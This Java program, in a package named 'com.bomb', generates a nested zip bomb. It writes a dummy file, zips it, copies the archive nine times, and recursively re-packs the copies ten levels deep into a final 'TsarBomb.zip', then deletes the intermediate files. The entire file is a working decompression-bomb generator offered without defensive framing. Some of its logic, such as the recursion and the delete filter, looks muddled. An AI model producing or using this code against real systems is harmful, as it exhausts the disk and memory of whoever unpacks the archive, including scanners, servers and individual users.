package com.bomb;

import java.io.*;
import java.nio.file.*;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.locks.Lock;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;
import java.util.zip.ZipOutputStream;

public class Main {

    static int masterIter = 0;
    private  static List<String> delete = new ArrayList<>();


    public static void main(String[] args) throws IOException, InterruptedException {

        String sourceFile = createFile();

        delete.add(sourceFile);

        Path zipPath = createZip(sourceFile);

        String [] zips = copyZip(zipPath);

        String[] finalBomb = copyZip(zips);

        copyZipFinal(finalBomb);

        Runtime.getRuntime().gc();

        deleteOld(delete);
    }

    private static synchronized void deleteOld(List<String> list) throws IOException {
        for (int i = 0; i < list.size(); i++){
            File file = new File(list.get(i).toString());
           Path path = Paths.get(String.valueOf(file));

            System.out.println("About to delete: " + String.valueOf(path));
            if (path.toString().contains(".zip") || path.toString().contains(".txt") && !path.toString().contains("java.oi")){
                try{
                    Files.delete(path);
                }catch (NoSuchFileException e){
                }
                System.out.println("deleted: " + path);
            }else{

            }
        }
    }

    public static String createFile() throws IOException {
            String file = "out.txt";
            Dummy dummy = new Dummy(file);
            dummy.write();
            return file;
    }

    public static Path createZip(String sourceFile) throws IOException {
        FileOutputStream fos = new FileOutputStream("bomb.zip");
        delete.add(fos.toString());
        ZipOutputStream zipOut = new ZipOutputStream(fos);
        File fileToZip = new File(sourceFile);
        FileInputStream fis = new FileInputStream(fileToZip);
        ZipEntry zipEntry = new ZipEntry(fileToZip.getName());
        zipOut.putNextEntry(zipEntry);
        byte[] bytes = new byte[8192];
        int length;
        while((length = fis.read(bytes)) >= 0) {
            zipOut.write(bytes, 0, length);
        }
        zipOut.close();
        fos.close();
        fis.close();
        zipOut.close();//
        return Paths.get("bomb.zip");
    }

    public static synchronized String[] copyZip(Path zipPath) throws IOException {

        File zipsCopyFile;
        for (int i = 0; i < 9; i++){
            zipsCopyFile = new File("master"+masterIter+"_"+ i + ".zip");
        }
        String[] zips = new String[9];
        for (int i = 0; i < 9; i++){
            Path savePath = Paths.get("master"+masterIter+"_"+ i + ".zip");
            Files.copy(zipPath,savePath, StandardCopyOption.REPLACE_EXISTING);
            zips[i] = savePath.toString();
            delete.add(savePath.toString());
        }
        return zips;
    }

    public static synchronized void copyZipFinal(String[] str) throws IOException {


        File outputFile = new File("TsarBomb.zip");
        FileInputStream fileInputStream = null;

        FileOutputStream outputStream = new FileOutputStream(outputFile);
        ZipOutputStream zipOutputStream = new ZipOutputStream(outputStream);
        for (int i = 0; i < str.length; i++){
            File fileToZip = new File(str[i]);
            fileInputStream = new FileInputStream(fileToZip);
            ZipEntry zipEntry = new ZipEntry(fileToZip.getName());
            zipOutputStream.putNextEntry(zipEntry);
            delete.add(fileToZip.toString());
            byte[] bytes = new byte[8192];
            int length;
            while((length = fileInputStream.read(bytes)) >= 0) {
                zipOutputStream.write(bytes, 0, length);
            }
        }
        fileInputStream.close();
        zipOutputStream.close();
    }


    public static synchronized String[] copyZip(String[] str) throws IOException, InterruptedException {
                String[] res = new String[9];
                File outputFile = new File("master" + (masterIter+1) + "_"+ 0 + ".zip");
                FileInputStream fileInputStream = null;
                masterIter++;

        FileOutputStream outputStream = new FileOutputStream(outputFile);
        ZipOutputStream zipOutputStream = new ZipOutputStream(outputStream);
        for (int i = 0; i < str.length; i++){
            File fileToZip = new File(str[i]);
            fileInputStream = new FileInputStream(fileToZip);
            ZipEntry zipEntry = new ZipEntry(fileToZip.getName());
            zipOutputStream.putNextEntry(zipEntry);
            delete.add( outputFile.getPath());
            res[i] = fileToZip.toString();
            byte[] bytes = new byte[8192];
            int length;
            while((length = fileInputStream.read(bytes)) >= 0) {
                zipOutputStream.write(bytes, 0, length);
            }
        }
        fileInputStream.close();
        zipOutputStream.close();
        outputStream.close();

        String[] zips = copyZip(Path.of(outputFile.toString()));
        if (masterIter == 10){
            return res;
        }
        return copyZip(zips);
    }
}
